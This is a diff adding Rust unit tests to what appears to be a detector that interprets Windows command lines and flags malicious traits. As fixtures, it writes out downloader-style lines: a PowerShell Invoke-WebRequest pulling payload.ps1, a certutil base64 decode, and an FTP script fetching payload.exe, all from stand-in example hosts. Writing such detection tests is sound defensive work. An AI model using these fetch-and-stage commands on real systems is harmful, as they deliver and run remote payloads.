@@ -6743,6 +6743,28 @@ mod powershell_tests {
     }
 
     #[test]
+    fn powershell_file_current_dir_nested_does_not_use_unrelated_basename_content() {
+        let mut env = Environment::new(&Config::default());
+        let wrong_ps1 =
+            b"Invoke-WebRequest https://ps-file-wrong-basename.example/payload.ps1".to_vec();
+        env.modified_filesystem.insert(
+            r#"c:\other\stage.ps1"#.to_string(),
+            FsEntry::Content {
+                content: wrong_ps1.clone(),
+                append: false,
+            },
+        );
+
+        interpret_line(r"powershell -NoProfile -File .\Temp\stage.ps1", &mut env);
+
+        assert!(
+            !env.exec_ps1.iter().any(|payload| payload == &wrong_ps1),
+            "PowerShell nested current-dir -File queued unrelated basename content: {:?}",
+            env.exec_ps1
+        );
+    }
+
+    #[test]
     fn powershell_file_slash_equivalent_tracks_script_content() {
         let mut env = Environment::new(&Config::default());
         let ps1 =
@@ -9133,6 +9155,38 @@ mod certutil_tests {
                 Some(FsEntry::Decoded { content, .. }) if content == payload.as_bytes()
             ),
             "dst.bin was not decoded from current-dir source content: {:?}",
+            env.modified_filesystem.get("dst.bin")
+        );
+    }
+
+    #[test]
+    fn certutil_decode_current_dir_nested_source_does_not_use_unrelated_basename_content() {
+        let mut env = Environment::new(&Config::default());
+        env.modified_filesystem.insert(
+            r#"c:\other\src.b64"#.to_string(),
+            FsEntry::Content {
+                content: b64("wrong nested source").into_bytes(),
+                append: false,
+            },
+        );
+
+        interpret_line(r"certutil -decode .\Temp\src.b64 dst.bin", &mut env);
+
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::CertutilDecode { src, dst, src_resolved }
+                    if src == r".\Temp\src.b64" && dst == "dst.bin" && !*src_resolved
+            )),
+            "certutil nested current-dir source should not resolve by unrelated basename: {:?}",
+            env.traits
+        );
+        assert!(
+            !matches!(
+                env.modified_filesystem.get("dst.bin"),
+                Some(FsEntry::Decoded { content, .. }) if content == b"wrong nested source"
+            ),
+            "dst.bin was decoded from unrelated basename content: {:?}",
             env.modified_filesystem.get("dst.bin")
         );
     }
@@ -16967,6 +17021,42 @@ ftp -n -s:ftp.txt"#,
                 )
             }),
             "current-dir ftp script get command was not surfaced as download: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn ftp_current_dir_nested_script_does_not_use_unrelated_basename_content() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        env.modified_filesystem.insert(
+            r#"c:\other\ftp.txt"#.to_string(),
+            crate::env::FsEntry::Content {
+                content: b"open ftp-wrong-basename.example.com\r\nget payload.exe out.exe\r\n"
+                    .to_vec(),
+                append: false,
+            },
+        );
+
+        crate::interp::interpret_line(r"ftp -n -s:.\Temp\ftp.txt", &mut env);
+
+        assert!(
+            !env.traits.iter().any(|t| matches!(
+                t,
+                Trait::RemoteConnect { cmd, host, .. }
+                    if cmd == r"ftp -n -s:.\Temp\ftp.txt"
+                        && host == "ftp-wrong-basename.example.com"
+            )),
+            "nested current-dir ftp script reused unrelated basename content: {:?}",
+            env.traits
+        );
+        assert!(
+            !env.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { cmd, src, .. }
+                    if cmd == r"ftp -n -s:.\Temp\ftp.txt"
+                        && src == "ftp://ftp-wrong-basename.example.com/payload.exe"
+            )),
+            "nested current-dir ftp script emitted download from unrelated basename content: {:?}",
             env.traits
         );
     }
